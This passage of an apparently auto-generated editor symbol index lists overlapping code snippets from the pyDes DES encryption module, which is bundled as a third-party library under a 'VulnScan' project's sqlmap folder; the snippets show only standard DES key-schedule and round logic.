        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.Kn",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.Kn = [ [0] * 48 ] * 16\t# 16 48-bit keys (K1 - K16)\n\t\tself.final = []\n\t\tself.setKey(key)\n\tdef setKey(self, key):\n\t\t\"\"\"Will set the crypting key for this object. Must be 8 bytes.\"\"\"\n\t\t_baseDes.setKey(self, key)\n\t\tself.__create_sub_keys()\n\tdef __String_to_BitList(self, data):\n\t\t\"\"\"Turn the string data, into a list of bits (1, 0)'s\"\"\"\n\t\tif _pythonMajorVersion < 3:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.final",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.final = []\n\t\tself.setKey(key)\n\tdef setKey(self, key):\n\t\t\"\"\"Will set the crypting key for this object. Must be 8 bytes.\"\"\"\n\t\t_baseDes.setKey(self, key)\n\t\tself.__create_sub_keys()\n\tdef __String_to_BitList(self, data):\n\t\t\"\"\"Turn the string data, into a list of bits (1, 0)'s\"\"\"\n\t\tif _pythonMajorVersion < 3:\n\t\t\t# Turn the strings into integers. Python 3 uses a bytes",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tdata = [ord(c) for c in data]\n\t\tl = len(data) * 8\n\t\tresult = [0] * l\n\t\tpos = 0\n\t\tfor ch in data:\n\t\t\ti = 7\n\t\t\twhile i >= 0:\n\t\t\t\tif ch & (1 << i) != 0:\n\t\t\t\t\tresult[pos] = 1\n\t\t\t\telse:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tl",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tl = len(data) * 8\n\t\tresult = [0] * l\n\t\tpos = 0\n\t\tfor ch in data:\n\t\t\ti = 7\n\t\t\twhile i >= 0:\n\t\t\t\tif ch & (1 << i) != 0:\n\t\t\t\t\tresult[pos] = 1\n\t\t\t\telse:\n\t\t\t\t\tresult[pos] = 0",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tresult",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tresult = [0] * l\n\t\tpos = 0\n\t\tfor ch in data:\n\t\t\ti = 7\n\t\t\twhile i >= 0:\n\t\t\t\tif ch & (1 << i) != 0:\n\t\t\t\t\tresult[pos] = 1\n\t\t\t\telse:\n\t\t\t\t\tresult[pos] = 0\n\t\t\t\tpos += 1",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tpos",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tpos = 0\n\t\tfor ch in data:\n\t\t\ti = 7\n\t\t\twhile i >= 0:\n\t\t\t\tif ch & (1 << i) != 0:\n\t\t\t\t\tresult[pos] = 1\n\t\t\t\telse:\n\t\t\t\t\tresult[pos] = 0\n\t\t\t\tpos += 1\n\t\t\t\ti -= 1",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\ti",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\ti = 7\n\t\t\twhile i >= 0:\n\t\t\t\tif ch & (1 << i) != 0:\n\t\t\t\t\tresult[pos] = 1\n\t\t\t\telse:\n\t\t\t\t\tresult[pos] = 0\n\t\t\t\tpos += 1\n\t\t\t\ti -= 1\n\t\treturn result\n\tdef __BitList_to_String(self, data):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\tresult[pos]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\t\tresult[pos] = 1\n\t\t\t\telse:\n\t\t\t\t\tresult[pos] = 0\n\t\t\t\tpos += 1\n\t\t\t\ti -= 1\n\t\treturn result\n\tdef __BitList_to_String(self, data):\n\t\t\"\"\"Turn the list of bits -> data, into a string\"\"\"\n\t\tresult = []\n\t\tpos = 0",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\tresult[pos]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\t\tresult[pos] = 0\n\t\t\t\tpos += 1\n\t\t\t\ti -= 1\n\t\treturn result\n\tdef __BitList_to_String(self, data):\n\t\t\"\"\"Turn the list of bits -> data, into a string\"\"\"\n\t\tresult = []\n\t\tpos = 0\n\t\tc = 0\n\t\twhile pos < len(data):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tresult",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tresult = []\n\t\tpos = 0\n\t\tc = 0\n\t\twhile pos < len(data):\n\t\t\tc += data[pos] << (7 - (pos % 8))\n\t\t\tif (pos % 8) == 7:\n\t\t\t\tresult.append(c)\n\t\t\t\tc = 0\n\t\t\tpos += 1\n\t\tif _pythonMajorVersion < 3:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tpos",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tpos = 0\n\t\tc = 0\n\t\twhile pos < len(data):\n\t\t\tc += data[pos] << (7 - (pos % 8))\n\t\t\tif (pos % 8) == 7:\n\t\t\t\tresult.append(c)\n\t\t\t\tc = 0\n\t\t\tpos += 1\n\t\tif _pythonMajorVersion < 3:\n\t\t\treturn ''.join([ chr(c) for c in result ])",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tc",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tc = 0\n\t\twhile pos < len(data):\n\t\t\tc += data[pos] << (7 - (pos % 8))\n\t\t\tif (pos % 8) == 7:\n\t\t\t\tresult.append(c)\n\t\t\t\tc = 0\n\t\t\tpos += 1\n\t\tif _pythonMajorVersion < 3:\n\t\t\treturn ''.join([ chr(c) for c in result ])\n\t\telse:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tc",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tc = 0\n\t\t\tpos += 1\n\t\tif _pythonMajorVersion < 3:\n\t\t\treturn ''.join([ chr(c) for c in result ])\n\t\telse:\n\t\t\treturn bytes(result)\n\tdef __permutate(self, table, block):\n\t\t\"\"\"Permutate this block with the specified table\"\"\"\n\t\treturn list(map(lambda x: block[x], table))\n\t# Transform the secret key, so that it is ready for data processing",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tkey",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tkey = self.__permutate(des.__pc1, self.__String_to_BitList(self.getKey()))\n\t\ti = 0\n\t\t# Split into Left and Right sections\n\t\tself.L = key[:28]\n\t\tself.R = key[28:]\n\t\twhile i < 16:\n\t\t\tj = 0\n\t\t\t# Perform circular left shifts\n\t\t\twhile j < des.__left_rotations[i]:\n\t\t\t\tself.L.append(self.L[0])",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\ti",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\ti = 0\n\t\t# Split into Left and Right sections\n\t\tself.L = key[:28]\n\t\tself.R = key[28:]\n\t\twhile i < 16:\n\t\t\tj = 0\n\t\t\t# Perform circular left shifts\n\t\t\twhile j < des.__left_rotations[i]:\n\t\t\t\tself.L.append(self.L[0])\n\t\t\t\tdel self.L[0]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.L",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.L = key[:28]\n\t\tself.R = key[28:]\n\t\twhile i < 16:\n\t\t\tj = 0\n\t\t\t# Perform circular left shifts\n\t\t\twhile j < des.__left_rotations[i]:\n\t\t\t\tself.L.append(self.L[0])\n\t\t\t\tdel self.L[0]\n\t\t\t\tself.R.append(self.R[0])\n\t\t\t\tdel self.R[0]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.R",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.R = key[28:]\n\t\twhile i < 16:\n\t\t\tj = 0\n\t\t\t# Perform circular left shifts\n\t\t\twhile j < des.__left_rotations[i]:\n\t\t\t\tself.L.append(self.L[0])\n\t\t\t\tdel self.L[0]\n\t\t\t\tself.R.append(self.R[0])\n\t\t\t\tdel self.R[0]\n\t\t\t\tj += 1",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tj",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tj = 0\n\t\t\t# Perform circular left shifts\n\t\t\twhile j < des.__left_rotations[i]:\n\t\t\t\tself.L.append(self.L[0])\n\t\t\t\tdel self.L[0]\n\t\t\t\tself.R.append(self.R[0])\n\t\t\t\tdel self.R[0]\n\t\t\t\tj += 1\n\t\t\t# Create one of the 16 subkeys through pc2 permutation\n\t\t\tself.Kn[i] = self.__permutate(des.__pc2, self.L + self.R)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tself.Kn[i]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tself.Kn[i] = self.__permutate(des.__pc2, self.L + self.R)\n\t\t\ti += 1\n\t# Main part of the encryption algorithm, the number cruncher :)\n\tdef __des_crypt(self, block, crypt_type):\n\t\t\"\"\"Crypt the block of data through DES bit-manipulation\"\"\"\n\t\tblock = self.__permutate(des.__ip, block)\n\t\tself.L = block[:32]\n\t\tself.R = block[32:]\n\t\t# Encryption starts from Kn[1] through to Kn[16]\n\t\tif crypt_type == des.ENCRYPT:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tblock",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tblock = self.__permutate(des.__ip, block)\n\t\tself.L = block[:32]\n\t\tself.R = block[32:]\n\t\t# Encryption starts from Kn[1] through to Kn[16]\n\t\tif crypt_type == des.ENCRYPT:\n\t\t\titeration = 0\n\t\t\titeration_adjustment = 1\n\t\t# Decryption starts from Kn[16] down to Kn[1]\n\t\telse:\n\t\t\titeration = 15",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.L",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.L = block[:32]\n\t\tself.R = block[32:]\n\t\t# Encryption starts from Kn[1] through to Kn[16]\n\t\tif crypt_type == des.ENCRYPT:\n\t\t\titeration = 0\n\t\t\titeration_adjustment = 1\n\t\t# Decryption starts from Kn[16] down to Kn[1]\n\t\telse:\n\t\t\titeration = 15\n\t\t\titeration_adjustment = -1",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.R",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.R = block[32:]\n\t\t# Encryption starts from Kn[1] through to Kn[16]\n\t\tif crypt_type == des.ENCRYPT:\n\t\t\titeration = 0\n\t\t\titeration_adjustment = 1\n\t\t# Decryption starts from Kn[16] down to Kn[1]\n\t\telse:\n\t\t\titeration = 15\n\t\t\titeration_adjustment = -1\n\t\ti = 0",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\titeration",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\titeration = 0\n\t\t\titeration_adjustment = 1\n\t\t# Decryption starts from Kn[16] down to Kn[1]\n\t\telse:\n\t\t\titeration = 15\n\t\t\titeration_adjustment = -1\n\t\ti = 0\n\t\twhile i < 16:\n\t\t\t# Make a copy of R[i-1], this will later become L[i]\n\t\t\ttempR = self.R[:]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\titeration_adjustment",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\titeration_adjustment = 1\n\t\t# Decryption starts from Kn[16] down to Kn[1]\n\t\telse:\n\t\t\titeration = 15\n\t\t\titeration_adjustment = -1\n\t\ti = 0\n\t\twhile i < 16:\n\t\t\t# Make a copy of R[i-1], this will later become L[i]\n\t\t\ttempR = self.R[:]\n\t\t\t# Permutate R[i - 1] to start creating R[i]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\titeration",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\titeration = 15\n\t\t\titeration_adjustment = -1\n\t\ti = 0\n\t\twhile i < 16:\n\t\t\t# Make a copy of R[i-1], this will later become L[i]\n\t\t\ttempR = self.R[:]\n\t\t\t# Permutate R[i - 1] to start creating R[i]\n\t\t\tself.R = self.__permutate(des.__expansion_table, self.R)\n\t\t\t# Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here\n\t\t\tself.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\titeration_adjustment",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\titeration_adjustment = -1\n\t\ti = 0\n\t\twhile i < 16:\n\t\t\t# Make a copy of R[i-1], this will later become L[i]\n\t\t\ttempR = self.R[:]\n\t\t\t# Permutate R[i - 1] to start creating R[i]\n\t\t\tself.R = self.__permutate(des.__expansion_table, self.R)\n\t\t\t# Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here\n\t\t\tself.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))\n\t\t\tB = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42], self.R[42:]]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\ti",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\ti = 0\n\t\twhile i < 16:\n\t\t\t# Make a copy of R[i-1], this will later become L[i]\n\t\t\ttempR = self.R[:]\n\t\t\t# Permutate R[i - 1] to start creating R[i]\n\t\t\tself.R = self.__permutate(des.__expansion_table, self.R)\n\t\t\t# Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here\n\t\t\tself.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))\n\t\t\tB = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42], self.R[42:]]\n\t\t\t# Optimization: Replaced below commented code with above",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\ttempR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\ttempR = self.R[:]\n\t\t\t# Permutate R[i - 1] to start creating R[i]\n\t\t\tself.R = self.__permutate(des.__expansion_table, self.R)\n\t\t\t# Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here\n\t\t\tself.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))\n\t\t\tB = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42], self.R[42:]]\n\t\t\t# Optimization: Replaced below commented code with above\n\t\t\t#j = 0\n\t\t\t#B = []\n\t\t\t#while j < len(self.R):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tself.R",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tself.R = self.__permutate(des.__expansion_table, self.R)\n\t\t\t# Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here\n\t\t\tself.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))\n\t\t\tB = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42], self.R[42:]]\n\t\t\t# Optimization: Replaced below commented code with above\n\t\t\t#j = 0\n\t\t\t#B = []\n\t\t\t#while j < len(self.R):\n\t\t\t#\tself.R[j] = self.R[j] ^ self.Kn[iteration][j]\n\t\t\t#\tj += 1",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tself.R",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tself.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))\n\t\t\tB = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42], self.R[42:]]\n\t\t\t# Optimization: Replaced below commented code with above\n\t\t\t#j = 0\n\t\t\t#B = []\n\t\t\t#while j < len(self.R):\n\t\t\t#\tself.R[j] = self.R[j] ^ self.Kn[iteration][j]\n\t\t\t#\tj += 1\n\t\t\t#\tif j % 6 == 0:\n\t\t\t#\t\tB.append(self.R[j-6:j])",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tB",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tB = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42], self.R[42:]]\n\t\t\t# Optimization: Replaced below commented code with above\n\t\t\t#j = 0\n\t\t\t#B = []\n\t\t\t#while j < len(self.R):\n\t\t\t#\tself.R[j] = self.R[j] ^ self.Kn[iteration][j]\n\t\t\t#\tj += 1\n\t\t\t#\tif j % 6 == 0:\n\t\t\t#\t\tB.append(self.R[j-6:j])\n\t\t\t# Permutate B[1] to B[8] using the S-Boxes",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t#j",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t#j = 0\n\t\t\t#B = []\n\t\t\t#while j < len(self.R):\n\t\t\t#\tself.R[j] = self.R[j] ^ self.Kn[iteration][j]\n\t\t\t#\tj += 1\n\t\t\t#\tif j % 6 == 0:\n\t\t\t#\t\tB.append(self.R[j-6:j])\n\t\t\t# Permutate B[1] to B[8] using the S-Boxes\n\t\t\tj = 0\n\t\t\tBn = [0] * 32",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t#B",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t#B = []\n\t\t\t#while j < len(self.R):\n\t\t\t#\tself.R[j] = self.R[j] ^ self.Kn[iteration][j]\n\t\t\t#\tj += 1\n\t\t\t#\tif j % 6 == 0:\n\t\t\t#\t\tB.append(self.R[j-6:j])\n\t\t\t# Permutate B[1] to B[8] using the S-Boxes\n\t\t\tj = 0\n\t\t\tBn = [0] * 32\n\t\t\tpos = 0",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t#\tself.R[j]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t#\tself.R[j] = self.R[j] ^ self.Kn[iteration][j]\n\t\t\t#\tj += 1\n\t\t\t#\tif j % 6 == 0:\n\t\t\t#\t\tB.append(self.R[j-6:j])\n\t\t\t# Permutate B[1] to B[8] using the S-Boxes\n\t\t\tj = 0\n\t\t\tBn = [0] * 32\n\t\t\tpos = 0\n\t\t\twhile j < 8:\n\t\t\t\t# Work out the offsets",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tj",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tj = 0\n\t\t\tBn = [0] * 32\n\t\t\tpos = 0\n\t\t\twhile j < 8:\n\t\t\t\t# Work out the offsets\n\t\t\t\tm = (B[j][0] << 1) + B[j][5]\n\t\t\t\tn = (B[j][1] << 3) + (B[j][2] << 2) + (B[j][3] << 1) + B[j][4]\n\t\t\t\t# Find the permutation value\n\t\t\t\tv = des.__sbox[j][(m << 4) + n]\n\t\t\t\t# Turn value into bits, add it to result: Bn",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tBn",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tBn = [0] * 32\n\t\t\tpos = 0\n\t\t\twhile j < 8:\n\t\t\t\t# Work out the offsets\n\t\t\t\tm = (B[j][0] << 1) + B[j][5]\n\t\t\t\tn = (B[j][1] << 3) + (B[j][2] << 2) + (B[j][3] << 1) + B[j][4]\n\t\t\t\t# Find the permutation value\n\t\t\t\tv = des.__sbox[j][(m << 4) + n]\n\t\t\t\t# Turn value into bits, add it to result: Bn\n\t\t\t\tBn[pos] = (v & 8) >> 3",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tpos",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tpos = 0\n\t\t\twhile j < 8:\n\t\t\t\t# Work out the offsets\n\t\t\t\tm = (B[j][0] << 1) + B[j][5]\n\t\t\t\tn = (B[j][1] << 3) + (B[j][2] << 2) + (B[j][3] << 1) + B[j][4]\n\t\t\t\t# Find the permutation value\n\t\t\t\tv = des.__sbox[j][(m << 4) + n]\n\t\t\t\t# Turn value into bits, add it to result: Bn\n\t\t\t\tBn[pos] = (v & 8) >> 3\n\t\t\t\tBn[pos + 1] = (v & 4) >> 2",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tm",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tm = (B[j][0] << 1) + B[j][5]\n\t\t\t\tn = (B[j][1] << 3) + (B[j][2] << 2) + (B[j][3] << 1) + B[j][4]\n\t\t\t\t# Find the permutation value\n\t\t\t\tv = des.__sbox[j][(m << 4) + n]\n\t\t\t\t# Turn value into bits, add it to result: Bn\n\t\t\t\tBn[pos] = (v & 8) >> 3\n\t\t\t\tBn[pos + 1] = (v & 4) >> 2\n\t\t\t\tBn[pos + 2] = (v & 2) >> 1\n\t\t\t\tBn[pos + 3] = v & 1\n\t\t\t\tpos += 4",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tn",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tn = (B[j][1] << 3) + (B[j][2] << 2) + (B[j][3] << 1) + B[j][4]\n\t\t\t\t# Find the permutation value\n\t\t\t\tv = des.__sbox[j][(m << 4) + n]\n\t\t\t\t# Turn value into bits, add it to result: Bn\n\t\t\t\tBn[pos] = (v & 8) >> 3\n\t\t\t\tBn[pos + 1] = (v & 4) >> 2\n\t\t\t\tBn[pos + 2] = (v & 2) >> 1\n\t\t\t\tBn[pos + 3] = v & 1\n\t\t\t\tpos += 4\n\t\t\t\tj += 1",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tv",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tv = des.__sbox[j][(m << 4) + n]\n\t\t\t\t# Turn value into bits, add it to result: Bn\n\t\t\t\tBn[pos] = (v & 8) >> 3\n\t\t\t\tBn[pos + 1] = (v & 4) >> 2\n\t\t\t\tBn[pos + 2] = (v & 2) >> 1\n\t\t\t\tBn[pos + 3] = v & 1\n\t\t\t\tpos += 4\n\t\t\t\tj += 1\n\t\t\t# Permutate the concatination of B[1] to B[8] (Bn)\n\t\t\tself.R = self.__permutate(des.__p, Bn)",
